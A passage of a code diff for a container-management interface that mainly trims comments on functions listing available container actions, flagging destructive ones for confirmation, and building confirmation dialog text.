-// offer "start" on something already running.
+// Which actions apply to a container now. Kept here so the set is testable.
 function availableActions(container, readOnly) {
   if (!container) return []
-  // Logs is the only thing left in read-only: `shell` is a prompt inside the
-  // container, which changes more than any button here.
+  // Logs is all that is left in read-only. A shell can change more than any button.
   if (readOnly === true) return ["logs"]
   if (container.running && !container.paused) return ["stop", "restart", "pause", "logs", "shell"]
   if (container.paused) return ["unpause", "stop", "logs"]
   return ["start", "remove", "logs"]
 }
 
-// The single gate every mutation passes through. Anything true here needs an
-// explicit confirmation naming what is destroyed; everything else is a plain
-// click. Kaj deliberately keeps this list short: friction on start/stop teaches
-// people to click through dialogs, which is how the destructive one gets
-// clicked through too.
+// Every mutation passes through here. True means it needs a confirmation.
+// The list is short: friction on start and stop teaches people to click through.
 function isDestructive(action) {
   return action === "remove" || action === "removeVolumes" || action === "prune"
     || action === "recreate" || action === "down"
 }
 
-// Human-readable consequence, shown in the confirm dialog. Never assembled from
-// container-controlled text without sanitizing first.
+// Shown in the confirm dialog. Never built from unsanitized container text.
 function confirmText(action, container) {
   var name = container ? container.name : "this container"
   if (action === "remove") return "Remove " + name + "? The container is deleted. Named volumes are kept."
